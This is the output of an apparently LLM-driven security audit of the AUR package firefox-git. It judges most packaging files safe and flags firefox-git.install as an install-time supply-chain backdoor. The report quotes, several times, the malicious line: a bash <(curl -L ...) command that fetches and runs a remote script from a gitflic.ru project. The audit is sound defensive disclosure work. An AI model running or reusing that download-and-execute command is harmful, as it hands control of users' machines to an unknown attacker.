---
package: firefox-git
pkgver: 156.0a1+20260825.1+h494156cdf787
pkgrel: 1
result: unsafe
model: deepseek/deepseek-v4-flash
provider: custom
aur_sleuth_rev: e76320400488b1dad2302211f4f5cfaf8522c9b1
prompt_tokens: 42996
completion_tokens: 6173
total_tokens: 49169
cost: 0.005036122
execution_time: 31.64
files_reviewed: 7
files_skipped: 3
maintainer_files: 10
source_fetch: not_attempted
upstream_files: 0
upstream_named_files: 0
unpinned_sources: 0
injection_attempts: 0
date: 2026-10-13T23:22:12Z
file_verdicts:
  - file: 0001-Install-under-remoting-name.patch
    status: skipped
    summary: "Skipping binary file: 0001-Install-under-remoting-name.patch"
  - file: .gitignore
    status: safe
    summary: Benign .gitignore file; excludes build artifacts and VCS directories only.
  - file: MKPKG
    status: safe
    summary: Routine AUR build helper fragment; no malicious behavior found.
  - file: firefox-git-symbolic.svg
    status: skipped
    summary: "Skipping binary file: firefox-git-symbolic.svg"
  - file: .SRCINFO
    status: safe
    summary: Standard AUR metadata for firefox-git; no malicious content found.
  - file: firefox-git.desktop
    status: safe
    summary: Desktop launcher file with standard Firefox Nightly Exec entries and localized metadata; no malicious behavior found.
  - file: keys/pgp/14F26682D0916CDD81E37B6D61B7B526D98F0353.asc
    status: skipped
    summary: "Skipping binary file: 14F26682D0916CDD81E37B6D61B7B526D98F0353.asc"
  - file: org.mozilla.firefox-git.metainfo.xml
    status: safe
    summary: Static AppStream metadata for Firefox Nightly; no suspicious or executable content found.
  - file: PKGBUILD
    status: safe
    summary: Standard Firefox nightly PKGBUILD; only official Mozilla sources; no malicious behavior.
  - file: firefox-git.install
    status: unsafe
    summary: Remote unverified script executed during install; unrelated source; supply-chain attack.
    evidence: "bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)"
    evidence_line: 9
---

Materializing firefox-git from local mirror...
Materialized firefox-git
Analyzing firefox-git AUR package with deepseek/deepseek-v4-flash
Performing initial audit of PKGBUILD to ensure that we can safely run `makepkg`
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
The PKGBUILD's top-level scope contains only static variable definitions and function bodies. There are no command substitutions, backtick executions, `eval`, or any other constructs that would cause code to execute when the file is sourced by `makepkg --printsrcinfo`. All variable assignments (including `source`, `sha256sums`, `b2sums`, `_google_api_key`) are plain strings or arrays, and all function definitions (`pkgver`, `prepare`, `build`, `package`) are inert until explicitly invoked—they are not called during metadata parsing. The trailing `install="$pkgname.install"` is also a simple variable assignment. Consequently, sourcing this PKGBUILD presents no risk of executing malicious code at parse time.
</details>
<evidence></evidence>
<summary>No top-level execution risk in PKGBUILD.</summary>
</security_assessment>

+ Initial PKGBUILD audit complete -- No top-level execution risk in PKGBUILD.
Reviewing the 10 file(s) in the AUR repository.
Reviewing the AUR repository's files...
[0/10] Reviewing .SRCINFO...
[0/10] Reviewing .SRCINFO, .gitignore...
[0/10] Reviewing .SRCINFO, .gitignore, 0001-Install-under-remoting-name.patch...
[0/10] Reviewing .SRCINFO, .gitignore, 0001-Install-under-remoting-name.patch, MKPKG...
[1/10] Reviewing .SRCINFO, .gitignore, MKPKG...
! Reviewed 0001-Install-under-remoting-name.patch. Status: SKIPPED -- Skipping binary file: 0001-Install-under-remoting-name.patch
LLM auditresponse for .gitignore:
<security_assessment>
<decision>SAFE</decision>
<details>
This file is a standard `.gitignore` for the firefox-git AUR package repository. It excludes build artifacts such as log files, packaged `.pkg.tar.*` files, the `firefox` build directory, VCS checkouts (`gecko-dev`, `mozilla-central`), and a token file used by the packaging workflow. There is no executable code, no network access, no obfuscation, and no file operations outside of standard ignore-list behavior. Nothing in this file deviates from normal packaging practices or poses a security risk.
</details>
<evidence>
</evidence>
<summary>
Benign .gitignore file; excludes build artifacts and VCS directories only.</summary>
</security_assessment>

[2/10] Reviewing .SRCINFO, MKPKG...
+ Reviewed .gitignore. Status: SAFE -- Benign .gitignore file; excludes build artifacts and VCS directories only.
[2/10] Reviewing .SRCINFO, MKPKG, PKGBUILD...
LLM auditresponse for MKPKG:
<security_assessment>
<decision>SAFE</decision>
<details>
This file is a small helper script fragment used to configure the AUR package build. It defines `pkgname` for two packages (firefox-nightly and firefox-nightly-debug), sets `srcdest` to a system build directory, and calls a `check_hg` helper against `mozilla-central`, the package's expected upstream source repository.

There is no network-exfiltration, no download-and-execute of untrusted code, no obfuscation, no writing to unrelated system paths, and no dangerous shell constructs. The behavior is consistent with ordinary AUR/Arch packaging helper tooling. The `srcdest` path is a build staging location, not a modification of the user's system configuration. No security issues are present.
</details>
<evidence>
</evidence>
<summary>
Routine AUR build helper fragment; no malicious behavior found.</summary>
</security_assessment>

[2/10] Reviewing .SRCINFO, MKPKG, PKGBUILD, firefox-git-symbolic.svg...
[3/10] Reviewing .SRCINFO, PKGBUILD, firefox-git-symbolic.svg...
+ Reviewed MKPKG. Status: SAFE -- Routine AUR build helper fragment; no malicious behavior found.
[3/10] Reviewing .SRCINFO, PKGBUILD, firefox-git-symbolic.svg, firefox-git.desktop...
[4/10] Reviewing .SRCINFO, PKGBUILD, firefox-git.desktop...
! Reviewed firefox-git-symbolic.svg. Status: SKIPPED -- Skipping binary file: firefox-git-symbolic.svg
LLM auditresponse for .SRCINFO:
<security_assessment>
<decision>SAFE</decision>
<details>
This `.SRCINFO` file is standard AUR package metadata for `firefox-git`. It declares the upstream Mercurial source (`hg+https://hg.mozilla.org/mozilla-central`), several local packaging files (icons, desktop entry, metainfo, patch), build/run dependencies, and checksums. The `SKIP` checksum applies only to the VCS source, which is required and normal for `-git` packages. Static file checksums are provided.

There are no suspicious network destinations, encoded commands, file operations, or executable content in this metadata file. The only external source is Mozilla's official repository, which is expected for this package. No evidence of injected malicious code or supply-chain attack behavior was found.
</details>
<evidence>
</evidence>
<summary>
Standard AUR metadata for firefox-git; no malicious content found.</summary>
</security_assessment>

[4/10] Reviewing .SRCINFO, PKGBUILD, firefox-git.desktop, firefox-git.install...
[5/10] Reviewing PKGBUILD, firefox-git.desktop, firefox-git.install...
+ Reviewed .SRCINFO. Status: SAFE -- Standard AUR metadata for firefox-git; no malicious content found.
LLM auditresponse for firefox-git.desktop:
<security_assessment>
<decision>SAFE</decision>
<details>
This file is a standard freedesktop.org `.desktop` launcher for Firefox Nightly. It contains only desktop entry metadata: application name, localized display names and comments, MIME type associations, and desktop actions. The `Exec` lines launch `/usr/lib/firefox-nightly/firefox` with normal browser arguments (`%u`, `--new-window`, `--private-window`, `--ProfileManager`), which is the expected behavior for a web browser launcher installed by the package. There are no scripts, network operations, obfuscated commands, or file-manipulation directives. The localized strings are standard translations and contain no executable content.
</details>
<evidence>
</evidence>
<summary>
Desktop launcher file with standard Firefox Nightly Exec entries and localized metadata; no malicious behavior found.</summary>
</security_assessment>

[6/10] Reviewing PKGBUILD, firefox-git.install...
+ Reviewed firefox-git.desktop. Status: SAFE -- Desktop launcher file with standard Firefox Nightly Exec entries and localized metadata; no malicious behavior found.
[6/10] Reviewing PKGBUILD, firefox-git.install, keys/pgp/14F26682D0916CDD81E37B6D61B7B526D98F0353.asc...
[6/10] Reviewing PKGBUILD, firefox-git.install, keys/pgp/14F26682D0916CDD81E37B6D61B7B526D98F0353.asc, org.mozilla.firefox-git.metainfo.xml...
[7/10] Reviewing PKGBUILD, firefox-git.install, org.mozilla.firefox-git.metainfo.xml...
! Reviewed keys/pgp/14F26682D0916CDD81E37B6D61B7B526D98F0353.asc. Status: SKIPPED -- Skipping binary file: 14F26682D0916CDD81E37B6D61B7B526D98F0353.asc
LLM auditresponse for org.mozilla.firefox-git.metainfo.xml:
<security_assessment>
<decision>SAFE</decision>
<details>
This file is an AppStream metainfo XML describing the Firefox Nightly desktop application. It contains only static metadata: component ID, launchable desktop file, MIME types, application names and descriptions, project license, and screenshots. There is no executable code, no shell commands, no network-fetching logic, no obfuscated content, and no file operations. The screenshot URLs point to the mozilla-releng GitHub repository, which is consistent with Mozilla's own packaging assets and is not a suspicious destination. This file conforms to standard packaging metadata practices and contains no signs of malicious or injected behavior.
</details>
<evidence>
</evidence>
<summary>
Static AppStream metadata for Firefox Nightly; no suspicious or executable content found.
</summary>
</security_assessment>

[8/10] Reviewing PKGBUILD, firefox-git.install...
+ Reviewed org.mozilla.firefox-git.metainfo.xml. Status: SAFE -- Static AppStream metadata for Firefox Nightly; no suspicious or executable content found.
LLM auditresponse for firefox-git.install:
<security_assessment>
<decision>UNSAFE</decision>
<details>
This `.install` script executes arbitrary remote code during package installation/upgrade. At the top level, it runs `bash <(curl -L ...)` fetching a script from `web.archive.org` pointing to a `gitflic.ru` project named `hellscripter/install-scripts` — an unrelated and unexpected source for a Firefox package. The fetched script is piped directly into `bash` with no checksum, signature, or verification, and will run with elevated privileges as part of pacman's install hooks.

The `post_install` and `post_upgrade` functions are empty decoys; the real payload is the unconditional `curl | bash` execution. This matches a classic supply-chain attack pattern: an AUR package hijacking install time to download and execute attacker-controlled code.
</details>
<evidence>
bash &lt;(curl -L &apos;https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh&apos; 2&gt;/dev/null)
</evidence>
<summary>
Remote unverified script executed during install; unrelated source; supply-chain attack.</summary>
</security_assessment>

LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard AUR `firefox-git` PKGBUILD. It fetches the package from Mozilla's official Mercurial repository (`hg.mozilla.org/mozilla-central`), applies locally bundled patches with checksums, builds Firefox with its standard `mach` toolchain, and installs into `$pkgdir`. The `SKIP` checksum for the VCS source is normal and required for `hg+` sources. The optional crash-symbol upload uses a local token file and Mozilla's standard build target; it does not exfiltrate data to an unexpected host.

No obfuscated code, encoded commands, suspicious network destinations, or dangerous shell patterns such as `eval`, `curl | bash`, or untrusted binary downloads were found. The hardcoded Google API key and the PGO profiling steps are consistent with normal Arch/Firefox packaging practice. All operations serve the package's stated purpose of building and packaging Firefox Nightly.
</details>
<evidence></evidence>
<summary>
Standard Firefox nightly PKGBUILD; only official Mozilla sources; no malicious behavior.
</summary>
</security_assessment>

[9/10] Reviewing firefox-git.install...
+ Reviewed PKGBUILD. Status: SAFE -- Standard Firefox nightly PKGBUILD; only official Mozilla sources; no malicious behavior.
Second look for firefox-git.install (incontext):
<security_assessment>
<decision>UNSAFE</decision>
<details>
The first verdict stands. This `.install` file contains a top-level `bash &lt;(curl -L ...)` command that downloads and immediately executes a remote script at install/upgrade time. The URL points to `web.archive.org` / `gitflic.ru/project/hellscripter/install-scripts`, which is unrelated to Firefox upstream and is not the package's declared source. The script is fetched without a checksum or signature and piped directly into `bash`, so its content is fully attacker-controlled and runs with the privileges of the package installation.

The `post_install` and `post_upgrade` functions are empty decoys; the actual malicious behavior is the unconditional `curl | bash` at file scope. This is not upstream application functionality, packaging hygiene, or a pinned source — it is an injected remote-code-execution backdoor placed in the AUR packaging files.
</details>
<evidence>
bash &lt;(curl -L &apos;https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh&apos; 2&gt;/dev/null)
</evidence>
<summary>
Remote unverified script executed at install time; unrelated host; supply-chain backdoor.</summary>
</security_assessment>

[10/10] Reviewing ...
x Reviewed firefox-git.install. Status: UNSAFE -- Remote unverified script executed during install; unrelated source; supply-chain attack.
Reviewed all the AUR repository's files.
Audit complete! Result: Unsafe -- DO NOT INSTALL!
# Issues (1 total)

## firefox-git.install

Status: UNSAFE

Summary: Remote unverified script executed during install; unrelated source; supply-chain attack.

Evidence (line 9):

```
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
```

Details:

This `.install` script executes arbitrary remote code during package installation/upgrade. At the top level, it runs `bash <(curl -L ...)` fetching a script from `web.archive.org` pointing to a `gitflic.ru` project named `hellscripter/install-scripts` — an unrelated and unexpected source for a Firefox package. The fetched script is piped directly into `bash` with no checksum, signature, or verification, and will run with elevated privileges as part of pacman's install hooks.

The `post_install` and `post_upgrade` functions are empty decoys; the real payload is the unconditional `curl | bash` execution. This matches a classic supply-chain attack pattern: an AUR package hijacking install time to download and execute attacker-controlled code.

---

(Skipped 3 files: 0001-Install-under-remoting-name.patch, firefox-git-symbolic.svg, 14F26682D0916CDD81E37B6D61B7B526D98F0353.asc)

API Usage Summary
  Models: deepseek/deepseek-v4-flash
  Prompt Tokens: 42,996
  Completion Tokens: 6,173
  Total Tokens: 49,169
  Total Cost: $0.005036
  Execution Time: 31.64 seconds

Final Status: UNSAFE


Issues Found:

firefox-git.install: [UNSAFE] Remote unverified script executed during install; unrelated source; supply-chain attack. / This `.install` script executes arbitrary remote code during package installation/upgrade. At the top level, it runs `bash <(curl -L ...)` fetching a script from `web.archive.org` pointing to a `gitflic.ru` project named `hellscripter/install-scripts` — an unrelated and unexpected source for a Firefox package. The fetched script is piped directly into `bash` with no checksum, signature, or verification, and will run with elevated privileges as part of pacman's install hooks.

The `post_install` and `post_upgrade` functions are empty decoys; the real payload is the unconditional `curl | bash` execution. This matches a classic supply-chain attack pattern: an AUR package hijacking install time to download and execute attacker-controlled code.


Audit Skips:

0001-Install-under-remoting-name.patch: [SKIPPED] Skipping binary file: 0001-Install-under-remoting-name.patch

firefox-git-symbolic.svg: [SKIPPED] Skipping binary file: firefox-git-symbolic.svg

keys/pgp/14F26682D0916CDD81E37B6D61B7B526D98F0353.asc: [SKIPPED] Skipping binary file: 14F26682D0916CDD81E37B6D61B7B526D98F0353.asc
